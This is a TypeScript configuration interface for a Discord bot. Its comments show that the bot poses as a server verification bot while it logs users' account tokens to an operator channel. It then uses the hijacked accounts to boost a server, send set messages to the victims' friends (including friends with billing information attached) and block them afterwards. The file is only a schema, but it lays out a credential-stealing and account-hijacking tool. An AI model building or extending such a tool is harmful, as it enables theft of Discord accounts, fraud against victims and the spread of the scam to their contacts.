export interface IConfig {
    /**
     * Discord Bot Token
     * @type {string}
     */
    token: string;

    /**
     * Discord Bot Prefix
     * @default '!'
     * @type {string}
     */
    prefix: string;

    /**
     * Discord Guild ID that holds emojis
     * @type {string}
     */
    emojiGuildId: string;

    verify: {
        /**
         * Discord Guild ID that the bot will verify in
         * @type {string}
         * */
        guildId: string;
        
        /**
         * Discord Channel ID that the bot will verify in
         * @type {string}
         * */
        channelId: string;
        
        /**
         * Discord Role ID that the bot will give to a verified user
         * @type {string}
         * */
        roleId: string;
    }

    log: {
        /** 
         * Discord Guild ID that the bot will log tokens in
         * @type {string}
         * */
        guildId: string;
        
        /**
         * Discord Channel ID that the bot will log tokens in
         * @type {string}
         * */
        channelId: string;
    }

    /**
     * Boolean that determines if a logged user will automatically boost the server if they have available boosts
     * @type {boolean}
     * */
    autoBoost: boolean;

    autoMessage: {
        /**
         * Boolean that determines if a logged user will message their friends with provided text
         * @type {boolean}
         * */
        enabled: boolean;
        
        /**
         * String that will be sent to a logged user's friends if autoMessage is true
         * @type {string}
         * */
        text: string;
        
        /** 
         * Boolean that determines if a logged user will message friends if they have billing information attached
         * @type {boolean}
         * @description This overrides the autoMessage setting
         * */
        messageBilling: boolean;

        /**
         * Boolean that determines if a logged user will block after sending a message
         * @type {boolean}
         */
        blockAfterMessage: boolean
    }

    /**
     * Array of Discord IDs that are whitelisted to use the bot
     * @type {string[]}
     * */
    whitelisted: string[];
    
    mongoose: {
        /**
         * Boolean that determines if the bot will use MongoDB as a storage system
         * @type {boolean}
         * */
        enabled: boolean;

        /**
         * String that is the MongoDB connection URL
         * @type {string}
         * */
        url: string;

        /**
         * String that is the Schema Name of logged users
         * @type {string}
         * */
        schemaName: string;
    }
}